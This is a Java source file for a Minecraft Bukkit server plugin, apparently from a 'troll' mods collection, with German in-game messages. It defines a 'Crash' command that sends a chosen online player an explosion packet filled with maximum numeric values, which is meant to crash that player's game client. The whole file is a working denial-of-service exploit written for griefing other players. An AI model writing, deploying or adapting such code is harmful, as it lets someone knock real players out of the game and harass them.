package com.troll.mods;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import com.troll.start.Start;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

public class CrashModule extends Module {

	public CrashModule() {
		super("Crash", "Leotendo", "Crashe den Client des Spielers");
	}

	@Override
	public boolean execute(Player p, String[] args) {
		if (args.length != 2) {
			p.sendMessage(Start.getInstance().getPrefix() + "§eBenutze: #crash <player>");
			return false;
		}
		
		Player target = Bukkit.getPlayer(args[1]);
		if (target == null) {
			p.sendMessage(Start.getInstance().getPrefix() + "§cDer Spieler ist nicht online!");
			return false;
		}
		
		PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST,
				new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
		
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		
		p.sendMessage(Start.getInstance().getPrefix() + "§aDer Spieler wird nun gecrasht!");
		
		return true;
	}
}
